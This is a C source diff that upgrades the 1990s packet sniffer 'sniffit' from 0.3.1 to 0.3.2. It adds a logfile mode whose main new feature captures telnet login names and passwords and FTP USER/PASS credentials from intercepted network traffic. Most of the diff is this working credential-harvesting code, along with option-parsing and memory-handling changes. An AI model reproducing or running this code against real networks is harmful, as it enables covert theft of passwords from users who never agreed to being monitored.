--- ./sniffit.0.3.1.c	Fri Sep 13 11:14:22 1996
+++ ./sniffit.0.3.2.c	Sat Sep  7 14:52:09 1996
@@ -4,9 +4,11 @@
 
 #include "config.h"                                  /* Config header file */
 #include "sn_defines.h"                                 /* Various defines */
+#include "sn_global.h"                                 /* some global defs */
 #include "sn_oldether.h"                 /* Leftover from 0.0.X and 0.1.X  */
 #include "sn_packets.h"                           /* My own packet structs */
 #include "sn_data.h"                                          /* data defs */
+#include "sn_logfile.h"
 #ifdef INCLUDE_INTERFACE
 #include "sn_interface.h"                            /* all ncurses stuff  */
 #endif
@@ -18,19 +20,21 @@
 void quit (char *prog_name)                    /* Learn to use the program */
 {
 	printf(
-"usage: %s [-x] [-d] [-a] [-b] [-P proto] [-A char] [-p port]\n"
-"       [-l sniflen] [-F snifdevice]"
+"usage: %s [-xdabvn] [-P proto] [-A char] [-p port]\n"
+"       [-l sniflen] [-L loglevel] [-F snifdevice]\n"
 #ifdef INCLUDE_INTERFACE
-" [-D tty]" 
-" (-t<Target IP> | -s<Source IP>)\n"
-"       | -i | -c<config file>\n",
+"       [-D tty]" 
+" (-t<Target IP> | -s<Source IP>)"
+" | -i | -c<config file>\n",
 #else
-" (-t<Target IP> | -s<Source IP>) | -c<config file>\n",
+"       (-t<Target IP> | -s<Source IP>) | -c<config file>\n",
 #endif
 		prog_name); 
 	exit(0); 
 }
 
+void my_exit (void)	{	exit(0);};
+
 /* DEBUGGING INFO */
 #ifdef DEBUG
 void close_debug_device (void)
@@ -50,7 +54,7 @@
 	int i;
 
 	for(i=0;i<strlen(string);i++)
-		*(string+i)=tolower(*(string+i));
+        	*(string+i) = ( isupper(*(string+i)) ? tolower(*(string+i)) : *(string+i) ); 
 	return string;
 }
 
@@ -60,8 +64,11 @@
 	dynam_len=0;
 }
 
-struct file_info *add_dynam (char *file, char ptype)
+/* if do_file == 0, then don't handle the files */
+/* this is for the global logfile option        */
+struct file_info *add_dynam (char *file, char ptype, char do_file, unsigned long cur_seq, int len) 
 {
+	int i;
 	FILE *f;
 	int last_time_out=0;
 	struct file_info *dummy_pointer; 
@@ -91,12 +98,23 @@
 	dummy_pointer->bytes=0;
 	dummy_pointer->proto=ptype;
 	strcpy(dummy_pointer->filename,file);
-	f = fopen(file,"a");   
-	if(f==NULL)
-		perror("Couldn't open logfile:"),exit(0);
-	dummy_pointer->f=f;
+	if(do_file!=0)
+		{
+		f = fopen(file,"a");   
+			if(f==NULL)
+			perror("Couldn't open logfile:"),exit(0);
+		dummy_pointer->f=f;
+		}
+	else	{
+		dummy_pointer->f=NULL;
+		}
 	dummy_pointer->next=NULL;
-
+	dummy_pointer->buffer=NULL;
+	dummy_pointer->log=0;
+	dummy_pointer->exp_seq=cur_seq+len;       
+	for(i=0;i<SCBUF;i++)	dummy_pointer->scroll_buf[i]=' ';       
+	dummy_pointer->scroll_buf[SCBUF]=0;       
+ 	
 	if(start_dynam==NULL)
 		start_dynam=dummy_pointer; 
 	else
@@ -110,7 +128,7 @@
 	return dummy_pointer;
 }
 
-void delete_dynam (char *file, char ptype)
+void delete_dynam (char *file, char ptype,char do_file)
 {
 	struct file_info *search_pointer;	
 	struct file_info *dummy_pointer;	
@@ -120,7 +138,7 @@
 	if( (strcmp(search_pointer->filename,file)==0) &&
 						(search_pointer->proto==ptype))
 		{
-		fclose(search_pointer->f);
+		if(do_file!=0)	fclose(search_pointer->f);
 		start_dynam=search_pointer->next;
 		dynam_len--;
 		return;
@@ -132,9 +150,10 @@
 		if( (strcmp(search_pointer->next->filename,file)==0) &&
 					(search_pointer->next->proto==ptype))
 			{
-			fclose(search_pointer->next->f);
+			if(do_file!=0) 	fclose(search_pointer->next->f);
 			dummy_pointer=search_pointer->next;
 			search_pointer->next=search_pointer->next->next;
+			if(dummy_pointer->buffer!=NULL) free(dummy_pointer->buffer);
 			free(dummy_pointer);
 			dynam_len--;
 			return;
@@ -143,6 +162,7 @@
 		}
 }
 
+/* returns NULL on failure */
 struct file_info *search_dynam(char *file, char ptype)
 {
 	struct file_info *search_pointer;
@@ -170,6 +190,64 @@
 	return NULL;
 }
 
+/* Type 0: TELNET  */
+void record_buf(struct file_info *dummy_pointer, unsigned long cur_seq_nr, char *data, int len, int type) 
+{
+int i,j,noloop=0;
+
+if(dummy_pointer->exp_seq != cur_seq_nr) 
+	{return;}
+noloop=0;
+for(i=0;i<len;i++)
+  {
+  j=dummy_pointer->bytes;
+  switch(type)
+  	{
+	case 0: if(data[i]==TELNET_ENTER)                 /* return found */
+			{dummy_pointer->log++;noloop=1;};
+		break;
+	default: break;
+	}
+  if(noloop==1)	break;
+  if(j>=LOG_PASS_BUF)	break;
+  if(isprint(data[i]))
+	{dummy_pointer->buffer[j]=data[i];}
+  else  {dummy_pointer->buffer[j]='~';};
+  dummy_pointer->buffer[j+1]=0;
+  dummy_pointer->bytes+=1;
+  }
+#ifdef	DEBUG_ONSCREEN
+	printf("Record buffer: >%s<  (%d)\n",dummy_pointer->buffer,dummy_pointer->bytes); 
+#endif
+}
+
+void sb_shift(struct file_info *dummy_pointer)
+{
+int i,j;
+
+for(i=1;i<SCBUF;i++)
+	dummy_pointer->scroll_buf[i-1]=dummy_pointer->scroll_buf[i];
+}
+
+void sbuf_update(struct file_info *dummy_pointer, unsigned long cur_seq_nr, char *data, int len) 
+{
+int i;
+
+if(dummy_pointer->exp_seq != cur_seq_nr)
+	{return;}
+
+for(i=0;i<len;i++)
+  {
+  sb_shift(dummy_pointer);
+  if(data[i]!=0)      /* used to be 'isprint', not possible for ftp logging */
+  	{dummy_pointer->scroll_buf[SCBUF-1]=data[i];}
+  else	{dummy_pointer->scroll_buf[SCBUF-1]='.';};        
+  }
+#ifdef DEBUG_ONSCREEN
+	printf("scr_buf: %s\n",dummy_pointer->scroll_buf);
+#endif
+}
+
 void print_iphead (struct IP_header *iphead, char icmp_or_plain)
 {
         int dummy;
@@ -204,6 +282,7 @@
 		const struct packetheader *p_header, 
 		const u_char *sp,
 		char *file,
+		char *file2,
 		struct unwrap *info,
 		char *detail,
 		int MODE)       
@@ -222,6 +301,7 @@
 	unsigned int n_s;           /* strlen short notation for wc bugfix */
 
 	proto=unwrap_packet(sp, info); 
+	if(proto == NO_IP)	return DONT_EXAMINE; /* no use in trying */
         memcpy(&iphead,(sp+PROTO_HEAD),sizeof(struct IP_header));
 	so=(u_char *)&(iphead.source);
        	dest=(u_char *)&(iphead.destination);
@@ -249,12 +329,12 @@
 		    sprintf(wc_so,"%u.%u.%u.%u",so[0],so[1],so[2],so[3]);
 		    sprintf(wc_dest,"%u.%u.%u.%u",dest[0],dest[1],dest[2],dest[3]);
 		    n_s = strlen(IP);
-		    if (MODE == DEST && (strncmp(wc_dest,IP,n_s)==0) /* -t */
+		    if (MODE == DEST && (strncmp(wc_dest,IP,n_s)!=0) /* -t */
 	           		||
-	   	        MODE == SOURCE && (strncmp(wc_so,IP,n_s)==0) /* -s */
+	   	        MODE == SOURCE && (strncmp(wc_so,IP,n_s)!=0) /* -s */
 		        	||
-		        MODE == BOTH && (strncmp(wc_dest,IP,n_s)==0) /* -b */
-			         && (strncmp(wc_so,IP,n_s)==0)
+		        MODE == BOTH && (strncmp(wc_dest,IP,n_s)!=0) /* -b */
+			         && (strncmp(wc_so,IP,n_s)!=0)
 	   	        )   return DONT_EXAMINE; 
 					      /* Check destination/source IP */
 		    }
@@ -398,9 +478,14 @@
                           /* inet_ntoa gave wrong output sometimes */
 		sprintf(file,"%u.%u.%u.%u.%u-%u.%u.%u.%u.%u",
 					so[0],so[1],so[2],so[3],
-					ntohs(tcphead.source),
+					(unsigned short)ntohs(tcphead.source),
 					dest[0],dest[1],dest[2],dest[3],
-					ntohs(tcphead.destination));
+					(unsigned short)ntohs(tcphead.destination));
+		sprintf(file2,"%u.%u.%u.%u.%u-%u.%u.%u.%u.%u",
+					dest[0],dest[1],dest[2],dest[3],
+					(unsigned short)ntohs(tcphead.destination),
+					so[0],so[1],so[2],so[3],
+					(unsigned short)ntohs(tcphead.source));
 
 		if ((ntohs(tcphead.offset_flag) & FIN) != 0)  
 						/* check for reset conn. */
@@ -444,10 +529,11 @@
 			const struct packetheader *p_header, 
 			const u_char *sp) 
 { 
-	char filename[50],header[SNAPLEN];
+	char filename[50], filename2[50],header[SNAPLEN];
 	FILE *f;
 	struct file_info *dummy_pointer;
 	u_char status=0;
+	char *help;
 	int dummy,finish;                    /* look out it's signed */
 	u_long datalen, position, total_length, i, n, ipaddr;
 	struct unwrap info;
@@ -458,7 +544,8 @@
         struct UDP_header udphead;
 
 	memcpy(&ipaddr,ipaddrpoint,sizeof(u_long));
-   	finish=check_packet(ipaddr,p_header,sp,filename,&info,header,SNIFMODE); 
+   	
+	finish=check_packet(ipaddr,p_header,sp,filename,filename2,&info,header,SNIFMODE); 
         if(PROTOCOLS & F_IP)
                 memcpy(&iphead,(sp+PROTO_HEAD),sizeof(struct IP_header)),
 							print_iphead(&iphead,0);
@@ -482,7 +569,7 @@
 		else 	printf("\n");
 		};
 
-	if(finish<10)			/* TCP packet */
+	if((finish<10)&&(LOGLEVEL==0))          	/* TCP packet */
 		/* I didn't use flags for later extention, and they */ 
 		/* don't come in pairs anyhow */
 		/* use return instead of else {if}, for later extention */
@@ -500,7 +587,8 @@
 		  	{
   			if(finish==TCP_FINISH) return;      
 					/* there was never data transmitted */
-			if((dummy_pointer=add_dynam(filename, TCP))==NULL)
+			/* seq_nr & datalen not important here yet */
+			if((dummy_pointer=add_dynam(filename, TCP, 1, 0, 0))==NULL)
 				return;
 			}
 		  f=dummy_pointer->f;
@@ -522,7 +610,7 @@
   			fflush(f);                                                  /* write all */
 			}
 		  if(finish==TCP_FINISH) /* let's reset the connection */
-			delete_dynam(filename, TCP);
+			delete_dynam(filename, TCP, 1);
 		  break;
 		
 		  case 1:         /* DUMP mode */
@@ -549,6 +637,158 @@
 		  }
 	      	return;
 		}
+
+	if((finish<10)&&(LOGLEVEL!=0))        /* TCP packet - logfile   */
+		/* This mode will grow, so I just copied the other if() */
+		/* instead of adding a dumpmode, I think this will keep */
+		/* things more simpel. Also I use the smart dynam       */ 
+		/* managment of connections                             */
+		{
+		memcpy(&tcphead,header,sizeof(struct TCP_header));
+	  	
+		dummy_pointer=search_dynam(filename, TCP);
+		if(dummy_pointer!=NULL) status=1; 
+		/* make a new entry unless it's reset */
+		if(status==0)               
+		  	{
+  			if(finish!=TCP_FINISH) 
+				if((dummy_pointer=add_dynam(filename, TCP, 0,ntohl(tcphead.seq_nr),info.DATA_len))==NULL)
+					return;
+			}
+
+		if(finish==TCP_FINISH) /* let's reset the connection */
+			{delete_dynam(filename, TCP, 0);}
+                /*** return before using any search or pointer!!!!!!!! ***/
+                /* Connections with FIN have deleted entries! */
+ 
+		dummy=ntohs(tcphead.offset_flag);
+	
+		if(LOGLEVEL<10)          /* Raw logging */
+		  {
+         	  if(dummy&SYN)	
+         		print_conn(filename,"Connection initiated. (SYN)");
+         	  if(dummy&FIN)   
+         		print_conn(filename,"Connection ending. (FIN)");
+         	  if(dummy&RST)   
+         		print_conn(filename,"Connection reset. (RST)");
+		  return;
+		  }
+		if(LOGLEVEL<30)          /* more sophisticated */
+		  {
+		  const u_char *data = sp+PROTO_HEAD+info.IP_len+info.TCP_len;
+
+		  if(search_dynam(filename2, TCP)==NULL)
+         	     {
+		     if(dummy&SYN)	
+         			print_conn(filename,"Connection initiated.");
+	
+         	     if(dummy&FIN)   
+         			print_conn(filename2,"Connection closed.");
+				
+		     }
+         	  if(dummy&FIN) return; /* needed, cauz entry don't exist  */  
+		  if(LOGLEVEL>=12)            /* loglevel 12 */
+		    {
+		    dummy_pointer=search_dynam(filename, TCP);
+                    /* don't forget to check dummy_pointer!!! */
+			
+		    if( (ntohs(tcphead.source) == 23) &&
+				         (dummy_pointer!=NULL))/* from telnet */
+		      {
+		      sbuf_update(dummy_pointer,ntohl(tcphead.seq_nr),data,info.DATA_len);
+		      /* detect login */
+		      strlower(dummy_pointer->scroll_buf);
+
+		      if((dummy_pointer->log!=99)&&(strstr(dummy_pointer->scroll_buf,"login")!=NULL))
+		 	{
+			dummy_pointer->log=99;
+			dummy_pointer=search_dynam(filename2, TCP);
+                        if(dummy_pointer!=NULL)
+				{dummy_pointer->log=1; 
+				dummy_pointer->bytes=0;
+				dummy_pointer->buffer=malloc(LOG_PASS_BUF);
+				if(dummy_pointer->buffer==NULL) exit(1);
+				dummy_pointer->buffer[0]=0;
+				}
+			else	{
+				print_conn(filename2,"Password missed due to overload.");
+				};
+#ifdef DEBUG_ONSCREEN
+			printf("Login detected, data initialised.\n");
+#endif
+			}
+ 		      }
+
+		    if( (ntohs(tcphead.destination) == 23) &&
+				         (dummy_pointer!=NULL))/* TO telnet */
+		      {
+		      if(dummy_pointer->log==1)	/* log login */
+			{
+			record_buf(dummy_pointer,ntohl(tcphead.seq_nr),data,info.DATA_len,0);
+         		if(dummy_pointer->log==2) /* login recorded */ 
+				{
+                                print_login(filename,dummy_pointer->buffer);
+	         		dummy_pointer->log=3; dummy_pointer->bytes=0;
+	         		dummy_pointer->buffer[0]=0;
+				}	
+			}
+		      else
+			{
+		        if(dummy_pointer->log==3)	/* log pwd */
+			  {
+			  record_buf(dummy_pointer,ntohl(tcphead.seq_nr),data,info.DATA_len,0);
+         		  if(dummy_pointer->log==4) /* passwd recorded */ 
+				{
+                                print_pwd(filename,dummy_pointer->buffer);
+	         		dummy_pointer->log=0; dummy_pointer->bytes=0;
+	         		dummy_pointer->buffer[0]=0;
+				}	
+			   }
+			}
+ 		      }
+                    }
+
+		    if( (ntohs(tcphead.destination) == 21) &&
+				         (dummy_pointer!=NULL))/* to FTP */
+		      {
+		      sbuf_update(dummy_pointer,ntohl(tcphead.seq_nr),data,info.DATA_len);
+		      /* detect USER en PASS  */
+		      if((help=strstr(dummy_pointer->scroll_buf,"USER"))!=NULL)
+		 	{
+			help+=strlen("USER ");
+			for(i=0;i<SCBUF;i++)
+				if(dummy_pointer->scroll_buf[i]==FTP_ENTER)
+					dummy_pointer->scroll_buf[i]=0;
+			print_ftp_user(filename,help);
+			for(i=0;i<SCBUF;i++)	dummy_pointer->scroll_buf[i]=' ';       
+			}
+		      if((help=strstr(dummy_pointer->scroll_buf,"PASS"))!=NULL)
+		 	{
+			help+=strlen("PASS ");
+			for(i=0;i<SCBUF;i++)
+				if(dummy_pointer->scroll_buf[i]==FTP_ENTER)
+					dummy_pointer->scroll_buf[i]=0;
+			print_ftp_pass(filename,help);
+			for(i=0;i<SCBUF;i++)	dummy_pointer->scroll_buf[i]=' ';       
+			}
+
+ 		      }
+
+
+		  if( (dummy_pointer=search_dynam(filename, TCP)) !=NULL)
+		    	{
+			if(ntohl(tcphead.seq_nr)==dummy_pointer->exp_seq)
+		       		dummy_pointer->exp_seq+=info.DATA_len;
+		  /* if we miss a packet... no probs seq nr's get updated */
+		  /* cauz' we can't rely on ACK's from other side         */
+	  	  /* it's pretty good this way                            */
+			if(ntohl(tcphead.seq_nr)>dummy_pointer->exp_seq)
+		       		dummy_pointer->exp_seq=ntohl(tcphead.seq_nr)+info.DATA_len;
+			}
+		  return;
+		  }
+		return;  /* DON'T FORGET THEM!!!! */
+		}
 	
 	if(finish<20)			/* ICMP packet */
 		{
@@ -745,15 +985,14 @@
 	int flag=0, doboth=0, FORCE_DEV=0;
 	extern char *optarg;
 
-
-	SNIFLEN=300;                            /* Set defaults */
-	DEST_PORT=0;                            /* Dest Port */
-	SNIFMODE=DUMPMODE=PROTOCOLS=ASC=WILDCARD=CFG_FILE=0;
+	signal (SIGINT, my_exit);       /* controled CTRL-C exit */
+	SNIFLEN=300;                             /* Set defaults */
+	DEST_PORT=0;                             /* Dest Port    */
+	SNIFMODE=DUMPMODE=PROTOCOLS=ASC=WILDCARD=CFG_FILE=NO_CHKSUM=0;
+	LOGLEVEL=0;
+	Logfile[0]=0;
 	IP=logging_device=NULL;  
 
-	if (getuid()!=0)
-		printf("You should be root to run this program!\n"), exit(1);
-
 #ifdef DEBUG
 	if((debug_dev=fopen(DEBUG_DEVICE,"a"))<0)
 		{printf("Couldn't open DEBUG device!\n");exit(0);}
@@ -765,12 +1004,16 @@
 #endif
 
 #ifdef INCLUDE_INTERFACE        
-	while((c=getopt(argc,argv,"D:A:P:idp:l:xabt:s:F:c:"))!=-1) { 
+	while((c=getopt(argc,argv,"D:A:P:idp:l:xabt:s:F:c:nvL:"))!=-1) { 
 #else
-	while((c=getopt(argc,argv,"A:P:dp:l:xabt:s:F:c:"))!=-1) { 
+	while((c=getopt(argc,argv,"A:P:dp:l:xabt:s:F:c:nvL:"))!=-1) { 
 #endif
                                                     /* Argument treating */
   		switch(c) {
+			case 'v':
+				printf("Sniffit Version %s - Copyright 1996 Brecht Claerhout\n",VERSION);
+				exit(0);
+				break;
 			case 'd':
 				DUMPMODE|=1;
 				break;
@@ -786,6 +1029,9 @@
 			case 'l':
 				SNIFLEN=atol(optarg);
 				break;
+			case 'L':
+				LOGLEVEL=atoi(optarg);
+				break;
 			case 'b':
 				doboth=1;
 				break;
@@ -817,6 +1063,9 @@
                                 flag++;
 				SNIFMODE=INTERACTIVE;
                                 break;
+                        case 'n':
+				NO_CHKSUM=1;
+                                break;
 			case 'F':
 				strcpy(forced_dev,optarg);
                                 FORCE_DEV=1;
@@ -833,16 +1082,22 @@
       			default : break;
 		}
 	}
-	if(flag!=1) 
-		quit(argv[0]);
+	if (getuid()!=0)
+		printf("You should be root to run this program!\n"), exit(1);
+	if(flag!=1) 	quit(argv[0]);
+	if( (LOGLEVEL!=0) && (CFG_FILE==0) )	quit(argv[0]);
+
+	if(LOGLEVEL != 0)	open_logfile();
 	if(PROTOCOLS==0) PROTOCOLS |= F_TCP;
 	if(doboth) SNIFMODE=BOTH;
         if((SNIFMODE!=INTERACTIVE)&&(CFG_FILE==0))  
 		{
-		if(index(IP,'x'))
+/*		if(index(IP,'x')) For SunOS  */
+		if(strchr(IP,'x'))
 		  {printf("Wildcard detected, IP nr. not checked...\n");
 		  WILDCARD=1;
-		  strcpy(index(IP,'x'),"\0");
+/*		  strcpy(index(IP,'x'),"\0"); */
+		  strcpy(strchr(IP,'x'),"\0");
 		  }
 		else
 		  {
